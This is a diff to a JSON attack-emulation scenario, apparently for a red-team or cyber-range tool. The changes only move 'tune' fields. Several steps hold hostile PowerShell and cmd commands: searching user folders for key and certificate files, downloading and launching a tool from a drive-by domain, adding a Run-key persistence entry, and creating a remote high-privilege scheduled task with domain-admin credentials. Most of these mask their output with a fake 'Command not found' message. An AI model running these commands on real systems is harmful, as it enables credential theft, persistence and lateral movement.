@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "help_win_x86.exe",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -91,7 +99,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -102,7 +111,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -112,10 +122,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -125,10 +135,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Set-Clipboard -Value $(gc C:\\Windows\\System32\\drivers\\etc\\hosts); echo \"stderr: \\1 Command not found\"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Set-Clipboard -Value $(gc C:\\Windows\\System32\\drivers\\etc\\hosts); echo \"stderr: \\1 Command not found\"}"
             }
         },
         {
@@ -139,7 +149,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Discovery",
@@ -148,10 +159,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "where /R C:\\Users *cert* *key* *pem* && echo \"stderr: \\1 Command not found\""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "where /R C:\\Users *cert* *key* *pem* && echo \"stderr: \\1 Command not found\""
             }
         },
         {
@@ -161,10 +172,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Invoke-WebRequest -Uri \"${self.driveby_domain2}/${self.tool_name2}\" -OutFile C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}; start C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}; echo \"stderr: \u0001 Command not found\"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Invoke-WebRequest -Uri \"${self.driveby_domain2}/${self.tool_name2}\" -OutFile C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}; start C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}; echo \"stderr: \u0001 Command not found\"}"
             }
         },
         {
@@ -174,10 +185,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}/f}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}/f}"
             }
         },
         {
@@ -187,10 +198,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c del C:\\Users\\Public\\pwn.txt && echo \"stderr: \u0001 Command not found\""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c del C:\\Users\\Public\\pwn.txt && echo \"stderr: \u0001 Command not found\""
             }
         },
         {
@@ -200,10 +211,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{schtasks.exe /create /f /SC once /ST 23:59 /TN${self.taskname}/TR${self.payload}/RL highest /u${self.domain_admin_username}@${self.domain}/p${self.domain_admin_password}/ru${self.domain_admin_username}@${self.domain}/rp${self.domain_admin_password}/s${self.dst_hostname}; echo \"stderr: \u0001 Command not found\"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{schtasks.exe /create /f /SC once /ST 23:59 /TN${self.taskname}/TR${self.payload}/RL highest /u${self.domain_admin_username}@${self.domain}/p${self.domain_admin_password}/ru${self.domain_admin_username}@${self.domain}/rp${self.domain_admin_password}/s${self.dst_hostname}; echo \"stderr: \u0001 Command not found\"}"
             }
         },
         {
@@ -214,7 +225,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -224,7 +236,8 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
